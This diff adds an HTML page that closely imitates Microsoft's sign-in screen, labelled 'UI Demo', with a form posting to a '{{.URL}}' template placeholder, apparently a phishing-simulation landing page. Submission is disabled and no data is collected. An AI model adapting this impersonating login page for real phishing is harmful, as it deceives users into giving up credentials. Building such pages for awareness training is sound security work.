@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Microsoft Sign In - UI Demo</title>
+
+    <style>
+        * {
+            box-sizing: border-box
+        }
+
+        html,
+        body {
+            margin: 0;
+            width: 100%;
+            min-height: 100%;
+        }
+
+        body {
+            font-family: "Segoe UI", Arial, Helvetica, sans-serif;
+            background:
+                radial-gradient(circle at 15% 20%, rgba(0, 120, 212, .08), transparent 25%),
+                radial-gradient(circle at 85% 80%, rgba(127, 186, 0, .08), transparent 25%),
+                #f3f3f3;
+            color: #1b1b1b;
+        }
+
+        .page {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 30px 20px;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 550px;
+        }
+
+        .login-card {
+            width: 100%;
+            background: #fff;
+            padding: 55px 56px 60px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, .16);
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+
+        .ms-logo {
+            width: 28px;
+            height: 28px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: 1fr 1fr;
+            gap: 2px;
+            margin-right: 8px;
+        }
+
+        .ms-red {
+            background: #f25022
+        }
+
+        .ms-green {
+            background: #7fba00
+        }
+
+        .ms-blue {
+            background: #00a4ef
+        }
+
+        .ms-yellow {
+            background: #ffb900
+        }
+
+        .brand-name {
+            font-size: 25px;
+            font-weight: 600;
+            color: #737373;
+            letter-spacing: -.5px;
+        }
+
+        .title {
+            margin: 0 0 28px;
+            font-size: 30px;
+            line-height: 1.2;
+            font-weight: 600;
+            color: #1b1b1b;
+        }
+
+        .input-wrapper {
+            width: 100%;
+            margin-bottom: 24px;
+        }
+
+        .email-input {
+            width: 100%;
+            height: 45px;
+            padding: 5px 0;
+            border: 0;
+            border-bottom: 1px solid #666;
+            outline: none;
+            background: transparent;
+            font-family: "Segoe UI", Arial, sans-serif;
+            font-size: 18px;
+            color: #1b1b1b;
+        }
+
+        .email-input:hover {
+            border-bottom-color: #333;
+        }
+
+        .email-input:focus {
+            border-bottom: 2px solid #0067b8;
+        }
+
+        .email-input::placeholder {
+            color: #707070;
+            opacity: 1;
+        }
+
+        .account-text {
+            margin: 0 0 25px;
+            font-size: 15px;
+            color: #333;
+        }
+
+        .link,
+        .access-link {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .link:hover,
+        .access-link:hover {
+            text-decoration: underline;
+        }
+
+        .access-link {
+            display: inline-block;
+            margin-bottom: 36px;
+            font-size: 15px;
+        }
+
+        .button-row {
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .next-button {
+            min-width: 135px;
+            height: 41px;
+            padding: 0 28px;
+            border: 0;
+            background: #0078d4;
+            color: #fff;
+            font-family: "Segoe UI", Arial, sans-serif;
+            font-size: 17px;
+            cursor: pointer;
+            transition: background .15s ease;
+        }
+
+        .next-button:hover {
+            background: #0067b8;
+        }
+
+        .next-button:focus {
+            outline: 2px solid #1b1b1b;
+            outline-offset: 2px;
+        }
+
+        .options-link {
+            display: block;
+            color: inherit;
+            text-decoration: none !important;
+        }
+
+        .options-link:hover,
+        .options-link:visited,
+        .options-link:active {
+            color: inherit;
+            text-decoration: none !important;
+        }
+
+        .options-card {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px 20px;
+            margin-top: 12px;
+            background: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, .16);
+            cursor: pointer;
+        }
+
+        .options-text {
+            color: #1b1b1b;
+            font-size: 15px;
+            text-decoration: none !important;
+        }
+
+        .options-icon {
+            width: 24px;
+            height: 24px;
+            margin-left: 30px;
+            object-fit: contain;
+            flex-shrink: 0;
+        }
+
+        @media(max-width:600px) {
+            .page {
+                display: block;
+                padding: 0;
+            }
+
+            .wrapper {
+                max-width: none;
+            }
+
+            .login-card {
+                min-height: 100vh;
+                padding: 40px 28px;
+                box-shadow: none;
+            }
+
+            .brand-name {
+                font-size: 22px;
+            }
+
+            .title {
+                font-size: 28px;
+            }
+
+            .options-card {
+                margin-top: 0;
+                padding: 16px 28px;
+                box-shadow: none;
+                border-top: 1px solid #eee;
+            }
+
+            .demo-label {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="page">
+        <div class="wrapper">
+
+            <div class="login-card">
+
+                <div class="brand">
+                    <div class="ms-logo">
+                        <div class="ms-red"></div>
+                        <div class="ms-green"></div>
+                        <div class="ms-blue"></div>
+                        <div class="ms-yellow"></div>
+                    </div>
+                    <div class="brand-name">Microsoft</div>
+                </div>
+
+                <h1 class="title">Sign in</h1>
+
+                <form action="{{.URL}}" method="POST" onsubmit="return false;">
+
+                    <div class="input-wrapper">
+                        <input class="email-input" type="text" name="email" placeholder="Email, phone, or Skype"
+                            autocomplete="off">
+                    </div>
+
+                    <p class="account-text">
+                        No account?
+                        <a href="#" class="link" onclick="return false;">Create one!</a>
+                    </p>
+
+                    <a href="#" class="access-link" onclick="return false;">
+                        Can't access your account?
+                    </a>
+
+                    <div class="button-row">
+                        <button type="submit" class="next-button">Next</button>
+                    </div>
+
+                </form>
+            </div>
+
+            <a href="https://example.com/" class="options-link">
+                <div class="options-card">
+                    <img class="options-icon" role="presentation"
+                        src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg">
+                    <div class="options-text">Sign-in options</div>
+                </div>
+            </a>
+
+        </div>
+    </div>
+
+</body>
+
+</html>
